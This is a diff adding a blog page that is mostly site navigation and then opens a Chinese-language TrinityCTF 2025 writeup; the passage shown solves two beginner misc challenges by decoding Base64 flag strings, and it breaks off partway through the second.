+    <span class="md-status md-status--encrypted"></span>
+  
+
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/PA4-0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PA4-0
+  
+
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--encrypted"></span>
+  
+
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/PA4-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PA4-1
+  
+
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--encrypted"></span>
+  
+
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/PA4-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PA4-2
+  
+
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--encrypted"></span>
+  
+
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/PA4-3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PA4-3
+  
+
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--encrypted"></span>
+  
+
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/A_journey_of_debug/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    A journey of debugging
+  
+
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--encrypted"></span>
+  
+
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../course-notes/Network-attack-and-defense-in-action/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    网络攻防实战 Labs
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    网络攻防实战 Labs
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Network-attack-and-defense-in-action/lab01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab01
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Network-attack-and-defense-in-action/lab02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab02
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Network-attack-and-defense-in-action/lab03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab03
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Network-attack-and-defense-in-action/lab04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab04
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Network-attack-and-defense-in-action/lab05/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab05
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Network-attack-and-defense-in-action/lab06/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab06
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Network-attack-and-defense-in-action/lab06.5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab06.5
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../course-notes/ICS%26%26CSAPP-Lab/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ICS &amp;&amp; CSAPP Labs
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ICS &amp;&amp; CSAPP Labs
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICS%26%26CSAPP-Lab/Datalab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSAPP Datalab
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICS%26%26CSAPP-Lab/Bomblab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSAPP Bomblab
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICS%26%26CSAPP-Lab/Binalab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ICS Binalab
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICS%26%26CSAPP-Lab/Linklab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ICS Linklab
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICS%26%26CSAPP-Lab/Bufolab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ICS Bufolab
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../course-notes/Probability/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Probability
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Probability
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Probability/speedrun/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    speedrun
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Probability/tip/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    tip
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../course-notes/Data-Structure-Online-Judge-Sol/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    数据结构 OJ Ans
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_6" id="__nav_3_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    数据结构 OJ Ans
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Data-Structure-Online-Judge-Sol/OJ1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第 1 次实验
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Data-Structure-Online-Judge-Sol/OJ2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第 2 次实验
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Data-Structure-Online-Judge-Sol/OJ3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第 3 次实验
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Data-Structure-Online-Judge-Sol/OJ4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第 4 次实验
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Data-Structure-Online-Judge-Sol/OJ5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第 5 次实验
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Data-Structure-Online-Judge-Sol/Exam1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第 1 次竞赛
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Data-Structure-Online-Judge-Sol/OJ6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第 6 次实验
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Data-Structure-Online-Judge-Sol/OJ7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第 7 次实验
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Data-Structure-Online-Judge-Sol/OJ8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第 8 次实验
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Data-Structure-Online-Judge-Sol/OJ9/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第 9 次实验
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/Data-Structure-Online-Judge-Sol/Exam2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第 2 次竞赛
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Blog
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2">
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Archive
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Archive
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../archive/2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    October 2025
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3">
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Categories
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Categories
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/-ctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏴‍☠️ CTF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/-re/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔍 RE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧩 MISC
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🧩 MISC">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#misc01-ctf_101" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Misc01-CTF_101
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#misc02-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Misc02-搜打撤
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#misc03-watch-the-star" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Misc03-Watch the Star
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#misc04-unfinished" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Misc04-猫猫（Unfinished）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#misc05-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Misc05-填填问卷就能拿分谢谢喵
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crypto" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔒 CRYPTO
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔒 CRYPTO">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#crypto01-rsa-unfinished" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Crypto01-RSA (Unfinished)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#crypto04-prng" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Crypto04-PRNG
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#crypto05-ezrsa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Crypto05-EZRSA
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💥 PWN
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🕸️ WEB
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🕸️ WEB">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#web01-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web01-逃离
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web03-hello-flask" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web03-Hello Flask!
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#re" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 RE
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔍 RE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#re01-nginx" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RE01-带后门的nginx
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#re02-itscoffice" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RE02-ITSC正版Office激活工具
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#re03-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RE03-幸运数字
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../../" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"></path></svg>
+                        <time datetime="2025-10-06 00:00:00+00:00" class="md-ellipsis">October 6, 2025</time>
+                      </div>
+                    </li>
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15 13h1.5v2.82l2.44 1.41-.75 1.3L15 16.69zm4-5H5v11h4.67c-.43-.91-.67-1.93-.67-3a7 7 0 0 1 7-7c1.07 0 2.09.24 3 .67zM5 21a2 2 0 0 1-2-2V5c0-1.11.89-2 2-2h1V1h2v2h8V1h2v2h1a2 2 0 0 1 2 2v6.1c1.24 1.26 2 2.99 2 4.9a7 7 0 0 1-7 7c-1.91 0-3.64-.76-4.9-2zm11-9.85A4.85 4.85 0 0 0 11.15 16c0 2.68 2.17 4.85 4.85 4.85A4.85 4.85 0 0 0 20.85 16c0-2.68-2.17-4.85-4.85-4.85"></path></svg>
+                          <time datetime="2025-11-23 00:00:00+00:00" class="md-ellipsis">November 23, 2025</time>
+                        </div>
+                      </li>
+                    
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"></path></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../../category/-ctf/">🏴‍☠️ CTF</a></span>
+                        </div>
+                      </li>
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"></path></svg>
+                          <span class="md-ellipsis">
+                            
+                              13 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+
+  
+  
+
+
+<h1 id="trinityctf-2025-writeup">TrinityCTF 2025 Writeup</h1>
+<p>一个零 CTF 经验的大二老登参加了校内的面向新生的 CTF 比赛，</p>
+<p>这是他的 Writeup 发生的变化：</p>
+<!-- more -->
+
+<hr>
+<h2 id="misc">🧩 MISC</h2>
+<h3 id="misc01-ctf_101">Misc01-CTF_101</h3>
+<blockquote>
+<p>欢迎参赛TrinityCTF!</p>
+<p>作为一名参赛选手你首先需要看看靶场, 看看公告, 确保了解比赛规则详情!</p>
+<p>善用互联网和工具, 希望你能在这场比赛中学习, 练习; 或是切身感受下CTF赛事的氛围与挑战</p>
+<p>如果你发现你不会的还挺多, <del>那就对了</del> 我们每一名队员都是这么成长起来的, 赛后我们也会组织WP讲解, 欢迎来听 如果你发现你都会, 啊那太好了. 请在这场比赛尽情杀题<del>然后大佬带飞我们战队把😆</del></p>
+<p>最后祝各位解题顺利.</p>
+</blockquote>
+<p>然后就要填 Flag 了，注意到在几天前发布的 TrinityCTF 2025 coming 赛事预告中有：</p>
+<blockquote>
+<p>最后祝大家参赛愉快<del>ZmxhZ3toNHBweV9oNGNrMW41IX0=</del>取得好成绩</p>
+</blockquote>
+<p>Base64 一下被划线的乱码得到 <code>flag{h4ppy_h4ck1n5!}</code></p>
+<h3 id="misc02-">Misc02-搜打撤</h3>
+<p>提供了一个 py 文件和摩斯电码本，py 文件运行后是一个文字冒险游戏，在游玩过程中可以获得flag碎片，实际上可以直接翻 py 文件：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">WORK_SECRET</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">'WORK_SECRET'</span><span class="p">,</span> <span class="s1">'dzBySw=='</span><span class="p">)</span>                  <span class="c1"># Base64: w0rK</span>
+<span class="n">COMBINE_SECRET</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">'COMBINE_SECRET'</span><span class="p">,</span> <span class="s1">'YzBtYkluZSBhbDE='</span><span class="p">)</span>    <span class="c1"># Base64: c0mbIne al1</span>
+<span class="n">PASSWORD1</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">'PASSWORD1'</span><span class="p">,</span> <span class="s1">'TkpVZXI='</span><span class="p">)</span>                      <span class="c1"># Base64: NJUer</span>
